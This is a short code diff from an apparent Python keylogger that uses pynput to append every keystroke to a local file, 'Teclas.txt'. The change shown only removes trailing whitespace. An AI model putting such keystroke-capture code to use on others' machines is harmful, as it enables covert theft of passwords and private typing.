@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener # type: ignore
 def keypress(key):
     try:
         with open('Teclas.txt', 'a') as file:
-            file.write(f'{key.char}')     
+            file.write(f'{key.char}')
     except AttributeError:
         with open('Teclas.txt', 'a') as file:
             file.write(f'\n{key}\n')
